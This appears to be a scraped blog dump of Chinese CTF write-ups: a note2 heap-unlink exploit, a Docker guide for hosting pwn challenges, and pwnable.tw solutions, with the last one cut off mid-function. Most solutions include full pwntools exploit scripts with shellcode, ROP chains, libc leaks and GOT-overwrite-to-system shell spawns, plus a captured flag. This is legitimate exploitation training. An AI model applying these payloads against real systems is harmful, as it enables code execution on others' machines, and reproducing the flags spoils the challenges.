分析相比于stkof显而易见的漏洞，这个因为edit的操作较为复杂，漏洞没有那么容易出来，但是如果出来便可以直接利用。在malloc时，可以输入size为0，这样将自动分配最小单位即0x20大小的chunk，但是在readstr时允许输入size-1大小的数，也就是0xffffffff，这样便足以溢出去修改。free之后再申请同样大小的chunk，便会将其列入第四个chunk但是位置仍然在之前chunk1的位置，通过之前size的漏洞修改chunk3的pre_size及size得到unlink的条件。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *sh = process(&apos;./note2&apos;)note2 = ELF(&apos;./note2&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)context.log_level = &apos;debug&apos;def newnote(length, content): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;(less than 128)&apos;) sh.sendline(str(length)) sh.recvuntil(&apos;content:&apos;) sh.sendline(content)def shownote(id): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id))def editnote(id, choice, s): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id)) sh.recvuntil(&apos;2.append]&apos;) sh.sendline(str(choice)) sh.sendline(s)def deletenote(id): sh.recvuntil(&apos;option---&gt;&gt;&apos;) sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;note:&apos;) sh.sendline(str(id))sh.recvuntil(&apos;name:&apos;)sh.sendline(&apos;siriuswhiter&apos;)sh.recvuntil(&apos;address:&apos;)sh.sendline(&apos;aaaaaaaaaaaaaaaaa&apos;)# chunk0: a fake chunkptr = 0x0000000000602120fakefd = ptr - 0x18fakebk = ptr - 0x10content = &apos;a&apos; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &apos;b&apos; * 64 + p64(0x60)#content = p64(fakefd) + p64(fakebk)newnote(128, content)# chunk1: a zero size chunk produce overwritenewnote(0, &apos;a&apos; * 8)# chunk2: a chunk to be overwrited and freednewnote(0x80, &apos;b&apos; * 16)gdb.attach(sh)# edit the chunk1 to overwrite the chunk2deletenote(1)content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)newnote(0, content)#gdb.attach(sh)# delete note 2 to trigger the unlink# after unlink, ptr[0] = ptr - 0x18deletenote(2)gdb.attach(sh)# overwrite the chunk0(which is ptr[0]) with got atoiatoi_got = note2.got[&apos;atoi&apos;]content = &apos;a&apos; * 0x18 + p64(atoi_got)editnote(0, 1, content)# get the aoti addrshownote(0)sh.recvuntil(&apos;is &apos;)atoi_addr = sh.recvuntil(&apos;\\n&apos;, drop=True)print atoi_addratoi_addr = u64(atoi_addr.ljust(8, &apos;\\x00&apos;))print &apos;leak atoi addr: &apos; + hex(atoi_addr)# get system addratoi_offest = libc.symbols[&apos;atoi&apos;]libcbase = atoi_addr - atoi_offestsystem_offest = libc.symbols[&apos;system&apos;]system_addr = libcbase + system_offestprint &apos;leak system addr: &apos;, hex(system_addr)# overwrite the atoi got with systemaddrcontent = p64(system_addr)editnote(0, 1, content)gdb.attach(sh)# get shellsh.recvuntil(&apos;option---&gt;&gt;&apos;)sh.sendline(&apos;/bin/sh&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Learning Docker","slug":"learning-docker","date":"2018-11-10T03:27:22.000Z","updated":"2018-11-10T08:34:21.443Z","comments":true,"path":"2018/11/10/learning-docker/","link":"","permalink":"http://siriuswhiter.tk/2018/11/10/learning-docker/","excerpt":"","text":"之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧 pwn环境部署 最基础的方法是socat， socat tcp-l:9999,fork exec:./pwn1 没有timeout，连得人多多半就爆炸了 所以选择：xinted + docker xintedxinted从权限到服务配置都做好了一个dockerfile,build即可 1git clone https://github.com/Eadom/ctf_xinetd.git docker 安装 因为没有用ubuntu，kali等其他的debian系等等没法直接 sudo apt-get install docker-ce kali最后成功安装docker的方法： 在/etc/apt/sources.list 中添加 1deb http://http.debian.net/debian jessie-backports main 更新源并安装即可 12apt-get update apt-get install docker.io 配置docker环境 将bin文件放置到bin目录下 修改flag内容 修改ctf.xinted的服务：port = 指定端口server_args = –userspec=1000:1000 /home/ctf ./binname build dockerfile12docker build -t &quot;binname&quot; . docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname 将镜像跑起来就ok了 pwn docker一个集成pwn常用工具的docker，暂时用的是pwndocker,不过比较臃肿，之后再自己搭建一个 使用一般刚开机docker未打开，使用service docker start打开服务 pull 1docker pull skysider/pwndocker docker images 可以看到已经在仓库里了 123/pwn/docker# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 各项含义： REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 docker run -t -i skysider/pwndocker直接进入bash 12~/pwn/docker# docker run -t -i skysider/pwndockerroot@b11ff1440061:/ctf/work# *b11ff1440061 是container的id* 外部文件要往container里复制，使用 1docker cp /path/file b11ff1440061: /path 当然b11ff1440061 换成container的id 因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装 有两种办法： 在container中安装完以后，exit 1docker commit b11ff1440061 pwndocker 同时可以使用 -m 来指定提交的说明信息，跟我们使用的版本控制一样-a 可以指定更新的用户信息之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息 这样可以将修改完的另存为新的image 1234~# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpwndocker latest 7c0fa09ee004 12 seconds ago 2.05GBskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 使用dockerfile重新build 像这里可以举例，编辑dockerfile： 123FROM skysider/pwndockerRUN apt-get install vim From 指定镜像源RUN 指令告诉docker 在镜像内执行命令，安装了什么。。EXPOSE 可以指定开放端口 编辑完后1docker build -t pwndocker . 按理说这样子就可以了。。但是我这里会有个报错The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1仍未解决","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"},{"name":"docker","slug":"docker","permalink":"http://siriuswhiter.tk/tags/docker/"}]},{"title":"pwnable.tw-wp","slug":"pwnable-tw-wp","date":"2018-11-06T11:37:08.000Z","updated":"2018-12-29T01:13:55.114Z","comments":true,"path":"2018/11/06/pwnable-tw-wp/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/","excerpt":"","text":"好久没碰pwn了，找找感觉pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题 start见到的最轻巧的一个题 题目12345678910111213141516171819202122232425262728293031func main()push esp; 4: result = 3;push offset _exitxor eax, eax; 5: __asmxor ebx, ebxxor ecx, ecxxor edx, edxpush &apos;:FTC&apos;push &apos; eht&apos;push &apos; tra&apos;push &apos;ts s&apos;push 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 60mov al, 3int 80h ; LINUX -add esp, 14hretnfunc exit()pop espxor eax, eaxinc eaxint 80h 以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出 分析大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。 exp1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./start&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10000)shellcode =&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot; print len(shellcode)pay = &apos;a&apos;*20 + p32(0x8048087) sh.recv()sh.send(pay)leak_addr = u32(sh.recv(4))print hex(leak_addr)esp_addr = leak_addr + 0x14pay = &apos;a&apos;*20 + p32(esp_addr) + shellcodesh.send(pay) #gdb.attach(sh)sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10000: Done210xff936bc0[*] Switching to interactive mode\\x00\\x00\\x005o\\x93\\xff\\x00\\x00\\x00\\x00Go\\x93\\xff$ whoamistart$ orw贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write 题目123456789101112131415161718192021222324252627282930313233343536373839main:int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125;orw_seccomp():unsigned int orw_seccomp()&#123; __int16 v1; // [esp+4h] [ebp-84h] char *v2; // [esp+8h] [ebp-80h] char v3; // [esp+Ch] [ebp-7Ch] unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u); v1 = 12; v2 = &amp;v3; prctl(38, 1, 0, 0, 0); // 38 PR_SET_NO_NEW_PRIVS // 将调用线程的no_new_privs位设置为值 // ARG2。将no_new_privs设置为1，execve（2）承诺不会 // 授予执行任何无法完成的任务的权限 // 没有execve（2）调用（例如，渲染集合 - // user-ID和set-group-ID模式位，以及非文件功能 // 功能性的）。设置后，该位不能取消设置。那个设定 // 这个位是由fork（2）和 // 克隆（2），并保存在execve（2）。 // prctl(22, 2, &amp;v1); // 22 PR_SET_SECCOMP // seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall, 这是不安全的, // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了. // 大概是终结了系统调用的可能,也就很难getshell了。 return __readgsdword(0x14u) ^ v4;&#125; 分析题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。 这块可以参考https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.hhttp://man7.org/linux/man-pages/man2/prctl.2.html 因为看不了题，不过在源码里能看到 12345 &lt;!-- description --&gt; &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt; 这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛 \"系统调用\" exp简直就是汇编实习现场了 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#sh = process(&apos;./orw&apos;)sh = remote(&quot;chall.pwnable.tw&quot;,10001)shellcode=&apos;&apos;&apos;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;mov ebx,esp;xor ecx,ecx;xor edx,edx;xor eax,eax;mov al,0x5;int 0x80; //openmov ebx,eax;xor eax,eax;mov al,0x3;mov ecx,esp;mov dl,0x30;int 0x80; //readmov al,0x4;mov bl,1;mov dl,0x30;int 0x80; //write&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))sh.sendline(asm(shellcode))sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10001: Done[*] Switching to interactive modeGive my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;�u�\\x0[*] Got EOF while reading in interactive$ calc前面还一对代码说题目干净，这个题就开始一堆代码了。。。 题目123456789101112131415161718192021222324252627282930313233343536373839unsigned int calc()&#123; int v1; // [esp+18h] [ebp-5A0h] int v2[100]; // [esp+1Ch] [ebp-59Ch] char s; // [esp+1ACh] [ebp-40Ch] unsigned int v4; // [esp+5ACh] [ebp-Ch] v4 = __readgsdword(0x14u); while ( 1 ) &#123; bzero(&amp;s, 0x400u); // 置字节字符串前n个字节为零且包括‘\\0’。 if ( !get_expr((int)&amp;s, 1024) ) break; init_pool(&amp;v1); //初始化v1 if ( parse_expr((int)&amp;s, &amp;v1) ) &#123; printf((const char *)&amp;_d, v2[v1 - 1]); fflush(stdout); &#125; &#125; return __readgsdword(0x14u) ^ v4;&#125;init_pool():_DWORD *__cdecl init_pool(_DWORD *a1)&#123; _DWORD *result; // eax signed int i; // [esp+Ch] [ebp-4h] result = a1; *a1 = 0; for ( i = 0; i &lt;= 99; ++i ) &#123; result = a1; a1[i + 1] = 0; &#125; return result;&#125; 重点函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120signed int __cdecl parse_expr(int a1, _DWORD *a2)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int O; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int num_left; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = a1; O = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) &#123; if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) &#123; v2 = i + a1 - v5; s1 = (char *)malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) // 输入不能为0 &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; num_left = atoi(s1); if ( num_left &gt; 0 ) &#123; v4 = (*a2)++; // v4为操作数数目 a2[v4 + 1] = num_left; // 操作数放入a2[1],a2[2],.... &#125; if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) // 若下一个操作数仍未操作符即报错 &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + a1; if ( s[O] ) // s[0]为操作数数目 &#123; switch ( *(char *)(i + a1) ) &#123; case &apos;%&apos;: case &apos;*&apos;: case &apos;/&apos;: if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; ) &#123; eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); &#125; else &#123; s[++O] = *(_BYTE *)(i + a1); &#125; break; case &apos;+&apos;: case &apos;-&apos;: eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); break; default: eval(a2, s[O--]); break; &#125; &#125; else &#123; s[O] = *(_BYTE *)(i + a1); &#125; if ( !*(_BYTE *)(i + a1) ) break; &#125; &#125; while ( O &gt;= 0 ) eval(a2, s[O--]); return 1;&#125;func eval():_DWORD *__cdecl eval(_DWORD *a1, char a2)&#123; _DWORD *result; // eax if ( a2 == &apos;+&apos; ) &#123; a1[*a1 - 1] += a1[*a1]; &#125; else if ( a2 &gt; &apos;+&apos; ) &#123; if ( a2 == &apos;-&apos; ) &#123; a1[*a1 - 1] -= a1[*a1]; &#125; else if ( a2 == &apos;/&apos; ) &#123; a1[*a1 - 1] /= a1[*a1]; &#125; &#125; else if ( a2 == &apos;*&apos; ) &#123; a1[*a1 - 1] *= a1[*a1]; &#125; result = a1; --*a1; return result; // 每一次计算的结果储存在 a1[1]&#125; 分析 看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。 程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数 用num来表示a1 则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是： num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2] 看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100 num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101 可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100] 也就可以泄露栈内存了！！ 第二步，假如输入 +100+12，计算逻辑便是： num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12 //为什么12会在num[101]处 总之，这样子便能对任意栈地址写了！！ 由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary） 因为输入输出什么的都是数字，所以系统调用最为明智。 exp!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *sh = process(&apos;./calc&apos;)bin = ELF(&apos;./calc&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10100) !!!! ROPgadget --binary ./calc --ropchain !!!!直接生成完整的rop链，简直不要太可怕from struct import pack# Padding goes herep = &apos;&apos;p+=p32(0x804967a)p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;/bin&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;//sh&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebxp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80for i in range(len(p)/4-1): sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))sh.sendline(&apos;&apos;)sh.interactive()$ whoamicalc 下面这个是相对正常的exp。。。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import * p=remote(&apos;chall.pwnable.tw&apos;,10100)#p=process(&quot;./calc&quot;)key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]p.recv()p.sendline(&apos;+360&apos;)addr_bp=int(p.recv())addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16addr_str=addr_re+20-0x100000000addr=361for i in range(5): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))p.recv()for i in range(5,8): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.send(&apos;kirin&apos;+&apos;\\n&apos;)p.interactive()$ whoamicalc dubble sort冒泡排序，小小的漏洞，简直就是课设车祸现场hhh只找到了第一个漏洞，泄露下地址，然后gg 题目12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax int *v4; // edi unsigned int v5; // esi unsigned int v6; // esi int v7; // ST08_4 int result; // eax unsigned int num; // [esp+18h] [ebp-74h] int v10; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int canary; // [esp+7Ch] [ebp-10h] canary = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, (int)&quot;What your name :&quot;); read(0, &amp;buf, 0x40u); // 没有截断，泄露libc基地址 __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;num); //没有限制输入个数，之后能栈溢出 v3 = num; if ( num ) &#123; v4 = &amp;v10; v5 = 0; do &#123; __printf_chk(1, (int)&quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); ++v5; v3 = num; ++v4; &#125; while ( num &gt; v5 ); &#125; // // // dubblesort((unsigned int *)&amp;v10, v3); // 出人意料的没有漏洞。。。。 // puts(&quot;Result :&quot;); // print if ( num ) &#123; v6 = 0; do &#123; v7 = *(&amp;v10 + v6); __printf_chk(1, (int)&quot;%u &quot;); ++v6; &#125; while ( num &gt; v6 ); &#125; // // // result = 0; if ( __readgsdword(0x14u) != canary ) process_end(); return result;&#125; 分析刚开始输入name，然后会将其打印出来，因为read没有\\x00截断，所以可以泄露出栈内存泄露libc基地址。 之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。 大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh 整体思路便是ret2libc 他们不知道怎么发现的如果在排序的时候输入 + 会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出。。。之前输出的数据一直很少，没发现。。 ps:新的寻找/bin/sh的方法！！1hexdump -C ./libc_32.so.6|grep /bin -A 1 而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。 exp先把大佬的放上来吧。。之后自己调成功了再放自己的。。。 1234567891011121314151617181920212223242526from pwn import * got_off = 0x1b0000system_off = 0x3a940bin_sh_off = 0x158e8b p = remote(&quot;chall.pwnable.tw&quot;,10101)p.recv()p.sendline(&apos;a&apos;*24)got_addr = u32(p.recv()[30:34])-0xalibc_addr = got_addr-got_offsystem_addr = libc_addr + system_offbin_sh_addr = libc_addr + bin_sh_offp.sendline(&apos;35&apos;)p.recv()for i in range(24): p.sendline(&apos;0&apos;) p.recv()p.sendline(&apos;+&apos;)p.recv()for i in range(9): p.sendline(str(system_addr)) p.recv()p.sendline(str(bin_sh_addr))p.recv()p.interactive() 参考：https://bbs.pediy.com/thread-228226.htm hacknote看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、 题目三个功能，添加，打印，删除、 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899unsigned int add()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( idx &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); // ptr[i] *ptr // if ( !ptr[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *(_DWORD *)ptr[i] = sub_804862B; // // // // printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; // // // // printf(&quot;Content :&quot;); read(0, *((void **)ptr[i] + 1), size); puts(&quot;Success !&quot;); ++idx; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125;unsigned int print()&#123; int idx; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= ::idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[idx] ) (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]); return __readgsdword(0x14u) ^ v3;&#125;unsigned int sub_80487D4()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[v1] ) &#123; free(*((void **)ptr[v1] + 1)); // ptr[v1] puts指针 // ptr[v1]+1 content指针 free(ptr[v1]); // uaf puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; 分析add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身这里需要使用system的参数截断，例如 “||sh”或者”;sh” 感觉正在用着残破不堪的工具。。要完了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *def add(size,content): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;size :&quot;) sh.sendline(size) sh.recvuntil(&quot;Content :&quot;) sh.sendline(content)def delete(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index) def print(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index)#sh = process(&apos;./hacknote&apos;)sh = remote(&quot;chall.pwnable.tw&quot;, 10102)elf=ELF(&quot;./hacknote&quot;)libc=ELF(&quot;./libc_32.so.6&quot;)read_got=elf.got[&quot;read&quot;]putnote=0x804862badd(&quot;16&quot;,15*&quot;a&quot;)add(&quot;16&quot;,15*&quot;a&quot;)delete(&apos;0&apos;)delete(&apos;1&apos;)add(&apos;8&apos;,p32(putnote)+p32(read_got))print(&apos;0&apos;) read_addr=u32(sh.recv()[:4])print hex(read_addr)sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] delete(&apos;2&apos;) add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\\x00&quot;)print(&apos;0&apos;)sh.interactive() silver_bullet风格比较有意思的一个题目 题目三个选项:1.create_bullet description最大为0x30，2.power_up 若description小于0x30,最多可以增加至0x30，3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。 重点函数 123456789101112131415161718192021int __cdecl power_up(char *bullet_ptr)&#123; char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); if ( !*bullet_ptr ) return puts(&quot;You need create the bullet first !&quot;); if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu ) return puts(&quot;You can&apos;t power up any more !&quot;); printf(&quot;Give me your another description of bullet :&quot;); read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); 